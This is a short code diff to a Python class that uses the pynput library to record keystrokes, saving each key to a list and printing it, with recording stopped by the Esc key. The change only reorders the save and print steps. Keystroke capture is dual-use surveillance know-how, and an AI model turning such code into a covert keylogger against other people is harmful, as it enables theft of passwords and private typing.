@@ -1,14 +1,14 @@
 from pynput import keyboard
 class Logger:
 
-    #take in key and print out key
+    #take in key, saves it and then prints out key
     def record(key):
         try:
-            print(key.char)
             keysave.append(key)
+            print(key.char)
         except AttributeError:
-            print(str(key)[4:])
             keysave.append(str(key)[4:])
+            print(str(key)[4:])
 
     #recording stops when pressing esc
     def stopRecord(key):
